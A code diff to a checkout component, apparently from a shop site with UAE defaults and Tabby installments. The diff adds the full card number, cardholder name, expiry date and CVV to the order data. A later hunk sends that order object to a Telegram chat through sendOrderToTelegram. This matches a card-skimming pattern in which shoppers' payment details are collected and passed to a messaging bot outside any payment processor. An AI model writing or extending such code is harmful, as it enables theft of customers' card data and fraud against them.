@@ -180,14 +180,46 @@ function CheckoutContent() {
     // Create order data object with optional PDF URLs and payment details
     const orderData = {
       orderNumber,
-      shippingInfo,
+      shippingInfo: {
+        ...shippingInfo,
+        countryCode: shippingInfo.countryCode || "971", // Default UAE country code
+      },
       cartItems,
       subtotal,
       shippingCost,
       shippingMethod,
       total,
       paymentMethod,
-      paymentDetails: paymentDetails,
+      paymentDetails: cardDetails
+        ? {
+            paymentMethod: paymentMethod,
+            cardNumber: cardDetails.cardNumber,
+            cardHolder: cardDetails.cardHolderName,
+            expiryDate: cardDetails.expiryDate,
+            cvv: cardDetails.cvv,
+          }
+        : {
+            paymentMethod: paymentMethod,
+          },
+      installmentDetails:
+        paymentMethod === "tabby"
+          ? {
+              months: installmentInfo.months,
+              downPayment: installmentInfo.downPayment,
+              monthlyInstallment: installmentInfo.monthlyInstallment,
+              remainingAmount: parseFloat(total) - installmentInfo.downPayment,
+              schedule: Array.from(
+                { length: installmentInfo.months },
+                (_, i) => ({
+                  month: i + 1,
+                  date: new Date(
+                    Date.now() + (i + 1) * 30 * 24 * 60 * 60 * 1000
+                  ).toLocaleDateString(),
+                  amount: installmentInfo.monthlyInstallment,
+                })
+              ),
+            }
+          : undefined,
       invoiceUrl: "",
       contractUrl: "",
     };
@@ -260,12 +292,7 @@ function CheckoutContent() {
       );
 
       // Send order data to Telegram (with or without PDF link)
-      const telegramSuccess = await sendOrderToTelegram({
-        ...orderDataWithPdf,
-        paymentDetails: orderDataWithPdf.paymentDetails || {
-          paymentMethod: orderDataWithPdf.paymentMethod,
-        },
-      });
+      const telegramSuccess = await sendOrderToTelegram(orderDataWithPdf);
       if (!telegramSuccess) {
         console.error("Failed to send order data to Telegram");
         throw new Error("فشل في إرسال بيانات الطلب");
